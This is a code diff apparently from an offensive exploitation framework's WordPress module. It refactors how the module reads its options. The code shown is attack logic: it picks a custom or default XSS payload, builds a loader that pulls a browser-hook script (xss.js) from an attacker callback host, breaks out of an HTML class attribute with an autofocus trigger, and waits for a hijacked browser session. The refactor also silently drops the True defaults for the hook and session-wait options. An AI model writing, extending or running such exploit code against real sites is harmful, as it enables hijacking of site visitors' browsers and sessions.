@@ -101,15 +101,12 @@ class Module(Auxiliary, Http_client, Wordpress, XssBrowserHookMixin):
         base = self._wp_base()
         return f"{base}/wp-admin/admin-ajax.php" if base != "/" else "/wp-admin/admin-ajax.php"
 
-    def _opt_bool(self, option, default: bool = False) -> bool:
-        return self._to_bool(getattr(option, "value", option) if option is not None else default)
-
     def _resolve_js_expression(self) -> str:
-        custom = self._opt_value(self.xss_payload)
+        custom = str(self.xss_payload or "").strip()
         if custom:
             return custom
 
-        if not self._opt_bool(self.hook_browser, True):
+        if not self._to_bool(self.hook_browser):
             return "alert(document.domain)"
 
         server = self._get_browser_server()
@@ -120,13 +117,13 @@ class Module(Auxiliary, Http_client, Wordpress, XssBrowserHookMixin):
             )
             return "alert(document.domain)"
 
-        callback = self._opt_value(self.callback_host)
+        callback = str(self.callback_host or "").strip()
         base = self.resolve_hook_base_url(callback)
         print_info(f"browser_server hook URL: {base}/xss.js")
         return self.build_inject_js_loader_js(callback_host=callback)
 
     def _trigger_mode(self) -> str:
-        return self.normalize_trigger_mode(self._opt_value(self.trigger_mode) or "autofocus")
+        return self.normalize_trigger_mode(str(self.trigger_mode or "autofocus"))
 
     def _send_probe(self, js_expr: str):
         class_value = self.build_attribute_breakout_class(js_expr, trigger=self._trigger_mode())
@@ -224,9 +221,9 @@ class Module(Auxiliary, Http_client, Wordpress, XssBrowserHookMixin):
             )
 
         hook_delivered = "createElement" in js_expr and server is not None
-        if self._opt_bool(self.wait_session, True) and hook_delivered:
+        if self._to_bool(self.wait_session) and hook_delivered:
             session_id = self.wait_for_browser_session(
-                timeout=float(int(self._opt_value(self.wait_timeout) or 120)),
+                timeout=float(int(self.wait_timeout or 120)),
                 known_sessions=known_sessions,
             )
             if session_id:
